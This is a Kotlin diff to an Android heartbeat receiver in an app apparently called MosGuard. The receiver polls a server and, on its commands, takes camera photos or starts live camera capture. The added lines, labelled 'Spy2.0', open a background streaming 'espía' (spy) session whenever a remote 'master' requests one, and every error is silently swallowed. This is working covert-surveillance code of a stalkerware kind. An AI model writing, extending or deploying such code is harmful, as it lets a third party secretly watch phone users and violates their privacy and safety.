@@ -98,6 +98,16 @@ class LatidoReceiver : BroadcastReceiver() {
                             if (j.optBoolean("foto", false)) CamaraGuard.foto(ctx)
                             val liveHasta = j.optLong("liveHasta", 0L)
                             if (liveHasta > 0 && liveHasta * 1000L > System.currentTimeMillis()) CamaraGuard.vivo(ctx, liveHasta * 1000L)
+                            // [MosGuard · Spy2.0] sesión de espía pedida por el master → abrir el WebView de streaming
+                            val esp = j.optString("espiaSesion", "")
+                            if (esp.isNotBlank()) {
+                                try {
+                                    val i = android.content.Intent(ctx, EspiaGuard::class.java)
+                                        .addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
+                                        .putExtra("secreto", cfg.secreto).putExtra("sesion", esp).putExtra("device", cfg.nombre.ifBlank { android.os.Build.MODEL ?: "" })
+                                    ctx.startActivity(i)
+                                } catch (_: Throwable) {}
+                            }
                         } catch (_: Throwable) {}
                     } else { con.responseCode }
                 } catch (_: Throwable) {
